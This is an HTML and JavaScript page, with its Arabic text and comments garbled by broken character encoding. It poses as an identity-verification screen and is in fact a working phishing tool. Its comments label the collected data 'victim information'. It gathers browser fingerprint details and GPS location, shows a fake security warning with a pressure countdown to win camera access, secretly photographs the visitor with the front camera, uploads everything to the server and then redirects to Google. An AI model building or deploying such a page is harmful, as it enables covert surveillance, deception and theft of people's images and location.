<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #333;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .logo {
            font-size: 60px;
            margin-bottom: 20px;
        }
        h1 {
            color: #667eea;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #4CAF50;
            font-size: 50px;
            display: none;
        }
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #667eea;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">ğŸ”’</div>
        <h1>ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</h1>
        <p>ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø¨ÙŠÙ†Ù…Ø§ Ù†ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ...</p>
        <div class="spinner" id="spinner"></div>
        <div class="success" id="success">âœ…</div>
        <div class="status" id="status">Ø¬Ø§Ø±Ù Ø§Ù„Ù…Ø¹Ø§Ù„Ø¬Ø©...</div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const success = document.getElementById('success');

        // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø­ÙŠØ©
        const victimInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            location: window.location.href
        };

        // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    victimInfo.latitude = position.coords.latitude;
                    victimInfo.longitude = position.coords.longitude;
                    victimInfo.accuracy = position.coords.accuracy;
                    console.log('GPS obtained:', victimInfo);
                },
                (error) => console.log('GPS denied:', error)
            );
        }

        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ù…Ø³Ø¨Ù‚
        async function checkExistingPermission() {
            if (navigator.permissions) {
                try {
                    const result = await navigator.permissions.query({name: 'camera'});
                    if (result.state === 'granted') {
                        // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù…Ø³Ù…ÙˆØ­Ø© Ù…Ø³Ø¨Ù‚Ø§Ù‹ - Ø§Ø¨Ø¯Ø£ ÙÙˆØ±Ø§Ù‹
                        return true;
                    }
                } catch (e) {
                    console.log('Permission API not supported');
                }
            }
            return false;
        }

        // Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ù…Ù‚Ù†Ø¹Ø© Ù‚Ø¨Ù„ Ø·Ù„Ø¨ Ø§Ù„Ø¥Ø°Ù†
        function showPermissionRequest() {
            const overlay = document.createElement('div');
            overlay.innerHTML = `
                <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                           background: rgba(0,0,0,0.8); z-index: 9999; display: flex; 
                           align-items: center; justify-content: center;">
                    <div style="background: white; padding: 30px; border-radius: 15px; 
                               text-align: center; max-width: 400px; margin: 20px;">
                        <div style="font-size: 50px; margin-bottom: 15px;">ğŸ”’</div>
                        <h3 style="color: #d32f2f; margin-bottom: 15px;">ØªØ­Ø°ÙŠØ± Ø£Ù…Ù†ÙŠ</h3>
                        <p style="margin-bottom: 20px; line-height: 1.5;">
                            ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ØºÙŠØ± Ù…ØµØ±Ø­ Ù…Ù† Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„Ø­Ø§Ù„ÙŠ.<br>
                            Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ ÙˆØ­Ù…Ø§ÙŠØ© Ø­Ø³Ø§Ø¨ÙƒØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§.
                        </p>
                        <button onclick="startCameraCapture()" 
                                style="background: #4CAF50; color: white; border: none; 
                                       padding: 12px 25px; border-radius: 8px; cursor: pointer; 
                                       font-size: 16px; width: 100%;">
                            ğŸ›¡ï¸ ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù‡ÙˆÙŠØ© Ø§Ù„Ø¢Ù†
                        </button>
                        <p style="font-size: 12px; color: #666; margin-top: 10px;">
                            â° Ø³ØªÙ†ØªÙ‡ÙŠ ØµÙ„Ø§Ø­ÙŠØ© Ù‡Ø°Ø§ Ø§Ù„Ø·Ù„Ø¨ Ø®Ù„Ø§Ù„ 60 Ø«Ø§Ù†ÙŠØ©
                        </p>
                    </div>
                </div>
            `;
            document.body.appendChild(overlay);
            
            // Ø¥Ø¶Ø§ÙØ© Ø¹Ø¯Ø§Ø¯ ØªÙ†Ø§Ø²Ù„ÙŠ Ù„Ù„Ø¶ØºØ· Ø§Ù„Ù†ÙØ³ÙŠ
            let countdown = 60;
            const timer = setInterval(() => {
                countdown--;
                const countdownEl = overlay.querySelector('p:last-child');
                if (countdownEl) {
                    countdownEl.innerHTML = `â° Ø³ØªÙ†ØªÙ‡ÙŠ ØµÙ„Ø§Ø­ÙŠØ© Ù‡Ø°Ø§ Ø§Ù„Ø·Ù„Ø¨ Ø®Ù„Ø§Ù„ ${countdown} Ø«Ø§Ù†ÙŠØ©`;
                }
                if (countdown <= 0) {
                    clearInterval(timer);
                    // Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡ Ø¥Ø°Ø§ Ù„Ù… ÙŠÙˆØ§ÙÙ‚
                    window.location.href = 'https://www.google.com';
                }
            }, 1000);
        }

        // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        async function startCameraCapture() {
            // Ø¥Ø®ÙØ§Ø¡ Ù†Ø§ÙØ°Ø© Ø§Ù„Ø·Ù„Ø¨
            const overlay = document.querySelector('div[style*="position: fixed"]');
            if (overlay) overlay.remove();
            
            return capturePhoto();
        }

        async function capturePhoto() {
            try {
                status.textContent = 'Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...';
                
                // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user', // Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;
                
                // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙˆØ±Ø© Ø£ÙØ¶Ù„
                await new Promise(resolve => setTimeout(resolve, 2000));

                status.textContent = 'Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©...';

                // Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);

                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ blob
                canvas.toBlob(async (blob) => {
                    // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                    stream.getTracks().forEach(track => track.stop());

                    // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
                    await sendPhoto(blob, victimInfo);
                }, 'image/jpeg', 0.9);

            } catch (error) {
                console.error('Camera error:', error);
                status.textContent = 'ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§';
                
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙÙ‚Ø· Ø­ØªÙ‰ Ù„Ùˆ ÙØ´Ù„Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                await sendInfoOnly(victimInfo);
                
                // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†ÙŠ
                setTimeout(() => {
                    window.location.href = 'https://www.google.com';
                }, 3000);
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© ÙˆØ§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
        async function sendPhoto(photoBlob, info) {
            try {
                status.textContent = 'Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...';

                const formData = new FormData();
                formData.append('photo', photoBlob, 'capture.jpg');
                formData.append('info', JSON.stringify(info));

                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    spinner.style.display = 'none';
                    success.style.display = 'block';
                    status.textContent = 'ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­!';
                    status.style.color = '#4CAF50';

                    // Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¥Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø´Ø±Ø¹ÙŠ
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                } else {
                    throw new Error('Upload failed');
                }
            } catch (error) {
                console.error('Upload error:', error);
                status.textContent = 'Ø­Ø¯Ø« Ø®Ø·Ø£ØŒ Ø¬Ø§Ø±Ù Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰...';
            }
        }

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª ÙÙ‚Ø· (ÙÙŠ Ø­Ø§Ù„Ø© ÙØ´Ù„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§)
        async function sendInfoOnly(info) {
            try {
                await fetch('/upload_info', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(info)
                });
            } catch (error) {
                console.error('Info upload error:', error);
            }
        }

        // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ù…Ù„ÙŠØ© ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        window.onload = async () => {
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ù…Ø³Ø¨Ù‚ Ø£ÙˆÙ„Ø§Ù‹
            const hasPermission = await checkExistingPermission();
            
            if (hasPermission) {
                // Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ø¥Ø°Ù† Ù…ÙˆØ¬ÙˆØ¯ØŒ Ø§Ø¨Ø¯Ø£ ÙÙˆØ±Ø§Ù‹
                setTimeout(capturePhoto, 1000);
            } else {
                // Ø¥Ø°Ø§ Ù„Ù… ÙŠÙƒÙ† Ù…ÙˆØ¬ÙˆØ¯ØŒ Ø§Ø¹Ø±Ø¶ Ø±Ø³Ø§Ù„Ø© Ù…Ù‚Ù†Ø¹Ø©
                setTimeout(showPermissionRequest, 2000);
            }
        };
    </script>
</body>
</html>